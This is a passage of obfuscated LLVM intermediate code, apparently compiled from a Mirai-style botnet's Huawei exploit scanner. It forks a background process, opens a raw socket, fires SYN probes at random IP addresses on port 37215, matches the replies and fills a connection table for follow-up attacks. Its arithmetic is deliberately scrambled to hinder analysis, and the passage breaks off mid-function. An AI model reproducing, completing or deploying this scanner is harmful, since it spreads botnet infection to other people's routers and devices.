  %70 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %69, i32 0, i32 2
  %71 = load i32, i32* %70, align 8
  %72 = icmp eq i32 %71, 4
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %68, %21
  br label %77

; <label>:74:                                     ; preds = %68
  %75 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %76 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %75, i32 0, i32 2
  store i32 1, i32* %76, align 8
  br label %77

; <label>:77:                                     ; preds = %74, %73
  %78 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %82 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %82, %struct.sockaddr** %81, align 8
  %83 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %84 = load %struct.sockaddr*, %struct.sockaddr** %83, align 8
  %85 = call i32 @connect(i32 %80, %struct.sockaddr* %84, i32 16)
  br label %86

; <label>:86:                                     ; preds = %77, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = sub i32 %40, 969315488
  %42 = add i32 %41, 1
  %43 = add i32 %42, 969315488
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @huawei_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37, %0
  ret void

; <label>:41:                                     ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #6
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @huawei_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %67

; <label>:50:                                     ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = sub i32 %62, -731928758
  %64 = add i32 %63, 1
  %65 = add i32 %64, -731928758
  %66 = add nsw i32 %62, 1
  store i32 %65, i32* %1, align 4
  br label %47

; <label>:67:                                     ; preds = %47
  %68 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %68, i32* @huawei_rsck, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %67
  call void @exit(i32 0) #12
  unreachable

; <label>:71:                                     ; preds = %67
  %72 = load i32, i32* @huawei_rsck, align 4
  %73 = load i32, i32* @huawei_rsck, align 4
  %74 = call i32 (i32, i32, ...) @fcntl(i32 %73, i32 3, i32 0)
  %75 = and i32 2048, %74
  %76 = xor i32 2048, %74
  %77 = or i32 %75, %76
  %78 = or i32 2048, %74
  %79 = call i32 (i32, i32, ...) @fcntl(i32 %72, i32 4, i32 %77)
  store i32 1, i32* %1, align 4
  %80 = load i32, i32* @huawei_rsck, align 4
  %81 = bitcast i32* %1 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %71
  %85 = load i32, i32* @huawei_rsck, align 4
  %86 = call i32 @close(i32 %85)
  call void @exit(i32 0) #12
  unreachable

; <label>:87:                                     ; preds = %71
  br label %88

; <label>:88:                                     ; preds = %99, %87
  %89 = call i32 @rand_next()
  %90 = xor i32 %89, -1
  %91 = xor i32 65535, -1
  %92 = xor i32 -14232408, -1
  %93 = or i32 %90, %91
  %94 = or i32 -14232408, %92
  %95 = xor i32 %93, -1
  %96 = and i32 %95, %94
  %97 = and i32 %89, 65535
  %98 = trunc i32 %96 to i16
  store i16 %98, i16* %2, align 2
  br label %99

; <label>:99:                                     ; preds = %88
  %100 = load i16, i16* %2, align 2
  %101 = call zeroext i16 @ntohs(i16 zeroext %100) #9
  %102 = zext i16 %101 to i32
  %103 = icmp slt i32 %102, 1024
  br i1 %103, label %88, label %104

; <label>:104:                                    ; preds = %99
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.anon.0*
  store %struct.anon.0* %107, %struct.anon.0** %4, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %109 = bitcast %struct.iphdr* %108 to i8*
  %110 = load i8, i8* %109, align 4
  %111 = xor i8 -16, -1
  %112 = xor i8 %110, %111
  %113 = and i8 %112, %110
  %114 = and i8 %110, -16
  %115 = xor i8 %113, -1
  %116 = xor i8 5, -1
  %117 = xor i8 34, -1
  %118 = and i8 %115, 34
  %119 = and i8 %113, %117
  %120 = and i8 %116, 34
  %121 = and i8 5, %117
  %122 = or i8 %118, %119
  %123 = or i8 %120, %121
  %124 = xor i8 %122, %123
  %125 = or i8 %115, %116
  %126 = xor i8 %125, -1
  %127 = or i8 34, %117
  %128 = and i8 %126, %127
  %129 = or i8 %124, %128
  %130 = or i8 %113, 5
  store i8 %129, i8* %109, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -12, -1
  %137 = or i8 %134, %135
  %138 = or i8 -12, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %132, align 4
  %146 = call zeroext i16 @htons(i16 zeroext 40) #9
  %147 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 2
  store i16 %146, i16* %148, align 2
  %149 = call i32 @rand_next()
  %150 = trunc i32 %149 to i16
  %151 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 3
  store i16 %150, i16* %152, align 4
  %153 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 64, i8* %154, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 6
  store i8 6, i8* %156, align 1
  %157 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %158 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %159 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %158, i32 0, i32 1
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %2, align 2
  %161 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %162 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %161, i32 0, i32 0
  store i16 %160, i16* %162, align 4
  %163 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %164 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %163, i32 0, i32 4
  %165 = load i16, i16* %164, align 4
  %166 = xor i16 -241, -1
  %167 = xor i16 %165, %166
  %168 = and i16 %167, %165
  %169 = and i16 %165, -241
  %170 = xor i16 %168, -1
  %171 = xor i16 80, -1
  %172 = xor i16 3488, -1
  %173 = and i16 %170, 3488
  %174 = and i16 %168, %172
  %175 = and i16 %171, 3488
  %176 = and i16 80, %172
  %177 = or i16 %173, %174
  %178 = or i16 %175, %176
  %179 = xor i16 %177, %178
  %180 = or i16 %170, %171
  %181 = xor i16 %180, -1
  %182 = or i16 3488, %172
  %183 = and i16 %181, %182
  %184 = or i16 %179, %183
  %185 = or i16 %168, 80
  store i16 %184, i16* %164, align 4
  %186 = call i32 @rand_next()
  %187 = xor i32 %186, -1
  %188 = xor i32 65535, -1
  %189 = xor i32 -954301248, -1
  %190 = or i32 %187, %188
  %191 = or i32 -954301248, %189
  %192 = xor i32 %190, -1
  %193 = and i32 %192, %191
  %194 = and i32 %186, 65535
  %195 = trunc i32 %193 to i16
  %196 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %197 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %196, i32 0, i32 5
  store i16 %195, i16* %197, align 2
  %198 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = xor i16 %200, -1
  %202 = xor i16 -513, -1
  %203 = xor i16 4082, -1
  %204 = or i16 %201, %202
  %205 = or i16 4082, %203
  %206 = xor i16 %204, -1
  %207 = and i16 %206, %205
  %208 = and i16 %200, -513
  %209 = xor i16 %207, -1
  %210 = xor i16 512, -1
  %211 = xor i16 -30473, -1
  %212 = and i16 %209, -30473
  %213 = and i16 %207, %211
  %214 = and i16 %210, -30473
  %215 = and i16 512, %211
  %216 = or i16 %212, %213
  %217 = or i16 %214, %215
  %218 = xor i16 %216, %217
  %219 = or i16 %209, %210
  %220 = xor i16 %219, -1
  %221 = or i16 -30473, %211
  %222 = and i16 %220, %221
  %223 = or i16 %218, %222
  %224 = or i16 %207, 512
  store i16 %223, i16* %199, align 4
  br label %225

; <label>:225:                                    ; preds = %888, %104
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %226 = load i32, i32* @huawei_fake_time, align 4
  %227 = load i32, i32* %10, align 4
  %228 = icmp ne i32 %226, %227
  br i1 %228, label %229, label %296

; <label>:229:                                    ; preds = %225
  %230 = load i32, i32* @huawei_fake_time, align 4
  store i32 %230, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %231

; <label>:231:                                    ; preds = %289, %229
  %232 = load i32, i32* %1, align 4
  %233 = icmp slt i32 %232, 160
  br i1 %233, label %234, label %295

; <label>:234:                                    ; preds = %231
  %235 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %235, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %236 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i64 1
  %238 = bitcast %struct.iphdr* %237 to %struct.anon.0*
  store %struct.anon.0* %238, %struct.anon.0** %16, align 8
  %239 = call i32 @rand_next()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 3
  store i16 %240, i16* %242, align 4
  %243 = load i32, i32* @LOCAL_ADDR, align 4
  %244 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = call i32 @get_random_ip.76()
  %247 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  store i32 %246, i32* %248, align 4
  %249 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 7
  store i16 0, i16* %250, align 2
  %251 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %252 = bitcast %struct.iphdr* %251 to i16*
  %253 = call zeroext i16 @checksum_generic(i16* %252, i32 20)
  %254 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 7
  store i16 %253, i16* %255, align 2
  %256 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %257 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %258 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %257, i32 0, i32 1
  store i16 %256, i16* %258, align 2
  %259 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 9
  %261 = load i32, i32* %260, align 4
  %262 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 2
  store i32 %261, i32* %263, align 4
  %264 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %265 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %264, i32 0, i32 6
  store i16 0, i16* %265, align 4
  %266 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %267 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %268 = bitcast %struct.anon.0* %267 to i8*
  %269 = call zeroext i16 @htons(i16 zeroext 20) #9
  %270 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %266, i8* %268, i16 zeroext %269, i32 20)
  %271 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %272 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %271, i32 0, i32 6
  store i16 %270, i16* %272, align 4
  %273 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %273, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  %276 = load i32, i32* %275, align 4
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %278 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %277, i32 0, i32 0
  store i32 %276, i32* %278, align 4
  %279 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %280 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %279, i32 0, i32 1
  %281 = load i16, i16* %280, align 2
  %282 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %281, i16* %282, align 2
  %283 = load i32, i32* @huawei_rsck, align 4
  %284 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %285 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %285, %struct.sockaddr** %284, align 8
  %286 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %287 = load %struct.sockaddr*, %struct.sockaddr** %286, align 8
  %288 = call i64 @sendto(i32 %283, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %287, i32 16)
  br label %289

; <label>:289:                                    ; preds = %234
  %290 = load i32, i32* %1, align 4
  %291 = sub i32 %290, 2139406867
  %292 = add i32 %291, 1
  %293 = add i32 %292, 2139406867
  %294 = add nsw i32 %290, 1
  store i32 %293, i32* %1, align 4
  br label %231

; <label>:295:                                    ; preds = %231
  br label %296

; <label>:296:                                    ; preds = %295, %225
  store i32 0, i32* %9, align 4
  br label %297

; <label>:297:                                    ; preds = %459, %428, %414, %399, %388, %373, %358, %349, %340, %333, %326, %296
  store i32 0, i32* %18, align 4
  %298 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %299 = bitcast i8* %298 to %struct.iphdr*
  store %struct.iphdr* %299, %struct.iphdr** %20, align 8
  %300 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i64 1
  %302 = bitcast %struct.iphdr* %301 to %struct.anon.0*
  store %struct.anon.0* %302, %struct.anon.0** %21, align 8
  %303 = call i32* @__errno_location() #9
  store i32 0, i32* %303, align 4
  %304 = load i32, i32* @huawei_rsck, align 4
  %305 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %306 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %306, align 8
  %307 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %308 = load %struct.sockaddr*, %struct.sockaddr** %307, align 8
  %309 = call i64 @recvfrom(i32 %304, i8* %305, i64 1514, i32 16384, %struct.sockaddr* %308, i32* null)
  %310 = trunc i64 %309 to i32
  store i32 %310, i32* %18, align 4
  %311 = load i32, i32* %18, align 4
  %312 = icmp sle i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %297
  %314 = call i32* @__errno_location() #9
  %315 = load i32, i32* %314, align 4
  %316 = icmp eq i32 %315, 11
  br i1 %316, label %321, label %317

; <label>:317:                                    ; preds = %313
  %318 = call i32* @__errno_location() #9
  %319 = load i32, i32* %318, align 4
  %320 = icmp eq i32 %319, 11
  br i1 %320, label %321, label %322

; <label>:321:                                    ; preds = %317, %313, %297
  br label %471

; <label>:322:                                    ; preds = %317
  %323 = load i32, i32* %18, align 4
  %324 = sext i32 %323 to i64
  %325 = icmp ult i64 %324, 40
  br i1 %325, label %326, label %327

; <label>:326:                                    ; preds = %322
  br label %297

; <label>:327:                                    ; preds = %322
  %328 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  %330 = load i32, i32* %329, align 4
  %331 = load i32, i32* @LOCAL_ADDR, align 4
  %332 = icmp ne i32 %330, %331
  br i1 %332, label %333, label %334

; <label>:333:                                    ; preds = %327
  br label %297

; <label>:334:                                    ; preds = %327
  %335 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 6
  %337 = load i8, i8* %336, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp ne i32 %338, 6
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %334
  br label %297

; <label>:341:                                    ; preds = %334
  %342 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %343 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %342, i32 0, i32 0
  %344 = load i16, i16* %343, align 4
  %345 = zext i16 %344 to i32
  %346 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %347 = zext i16 %346 to i32
  %348 = icmp ne i32 %345, %347
  br i1 %348, label %349, label %350

; <label>:349:                                    ; preds = %341
  br label %297

; <label>:350:                                    ; preds = %341
  %351 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %352 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %351, i32 0, i32 1
  %353 = load i16, i16* %352, align 2
  %354 = zext i16 %353 to i32
  %355 = load i16, i16* %2, align 2
  %356 = zext i16 %355 to i32
  %357 = icmp ne i32 %354, %356
  br i1 %357, label %358, label %359

; <label>:358:                                    ; preds = %350
  br label %297

; <label>:359:                                    ; preds = %350
  %360 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %361 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %360, i32 0, i32 4
  %362 = load i16, i16* %361, align 4
  %363 = lshr i16 %362, 9
  %364 = xor i16 %363, -1
  %365 = xor i16 1, -1
  %366 = xor i16 5022, -1
  %367 = or i16 %364, %365
  %368 = or i16 5022, %366
  %369 = xor i16 %367, -1
  %370 = and i16 %369, %368
  %371 = and i16 %363, 1
  %372 = icmp ne i16 %370, 0
  br i1 %372, label %374, label %373

; <label>:373:                                    ; preds = %359
  br label %297

; <label>:374:                                    ; preds = %359
  %375 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %376 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %375, i32 0, i32 4
  %377 = load i16, i16* %376, align 4
  %378 = lshr i16 %377, 12
  %379 = xor i16 %378, -1
  %380 = xor i16 1, -1
  %381 = xor i16 19624, -1
  %382 = or i16 %379, %380
  %383 = or i16 19624, %381
  %384 = xor i16 %382, -1
  %385 = and i16 %384, %383
  %386 = and i16 %378, 1
  %387 = icmp ne i16 %385, 0
  br i1 %387, label %389, label %388

; <label>:388:                                    ; preds = %374
  br label %297

; <label>:389:                                    ; preds = %374
  %390 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %391 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %390, i32 0, i32 4
  %392 = load i16, i16* %391, align 4
  %393 = lshr i16 %392, 10
  %394 = xor i16 1, -1
  %395 = xor i16 %393, %394
  %396 = and i16 %395, %393
  %397 = and i16 %393, 1
  %398 = icmp ne i16 %396, 0
  br i1 %398, label %399, label %400

; <label>:399:                                    ; preds = %389
  br label %297

; <label>:400:                                    ; preds = %389
  %401 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %402 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %401, i32 0, i32 4
  %403 = load i16, i16* %402, align 4
  %404 = lshr i16 %403, 8
  %405 = xor i16 %404, -1
  %406 = xor i16 1, -1
  %407 = xor i16 -23295, -1
  %408 = or i16 %405, %406
  %409 = or i16 -23295, %407
  %410 = xor i16 %408, -1
  %411 = and i16 %410, %409
  %412 = and i16 %404, 1
  %413 = icmp ne i16 %411, 0
  br i1 %413, label %414, label %415

; <label>:414:                                    ; preds = %400
  br label %297

; <label>:415:                                    ; preds = %400
  %416 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %417 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %416, i32 0, i32 3
  %418 = load i32, i32* %417, align 4
  %419 = call i32 @ntohl(i32 %418) #9
  %420 = sub i32 0, 1
  %421 = add i32 %419, %420
  %422 = sub i32 %419, 1
  %423 = call i32 @htonl(i32 %421) #9
  %424 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 8
  %426 = load i32, i32* %425, align 4
  %427 = icmp ne i32 %423, %426
  br i1 %427, label %428, label %429

; <label>:428:                                    ; preds = %415
  br label %297

; <label>:429:                                    ; preds = %415
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %430 = load i32, i32* %9, align 4
  store i32 %430, i32* %18, align 4
  br label %431

; <label>:431:                                    ; preds = %449, %429
  %432 = load i32, i32* %18, align 4
  %433 = icmp slt i32 %432, 128
  br i1 %433, label %434, label %455

; <label>:434:                                    ; preds = %431
  %435 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %436 = load i32, i32* %18, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %435, i64 %437
  %439 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %438, i32 0, i32 2
  %440 = load i32, i32* %439, align 8
  %441 = icmp eq i32 %440, 0
  br i1 %441, label %442, label %448

; <label>:442:                                    ; preds = %434
  %443 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %444 = load i32, i32* %18, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %443, i64 %445
  store %struct.exploit_scanner_connection* %446, %struct.exploit_scanner_connection** %22, align 8
  %447 = load i32, i32* %18, align 4
  store i32 %447, i32* %9, align 4
  br label %455

; <label>:448:                                    ; preds = %434
  br label %449

; <label>:449:                                    ; preds = %448
  %450 = load i32, i32* %18, align 4
  %451 = sub i32 %450, 1665723757
  %452 = add i32 %451, 1
  %453 = add i32 %452, 1665723757
  %454 = add nsw i32 %450, 1
  store i32 %453, i32* %18, align 4
  br label %431

; <label>:455:                                    ; preds = %442, %431
  %456 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %457 = icmp eq %struct.exploit_scanner_connection* %456, null
  br i1 %457, label %458, label %459

; <label>:458:                                    ; preds = %455
  br label %471

; <label>:459:                                    ; preds = %455
  %460 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 8
  %462 = load i32, i32* %461, align 4
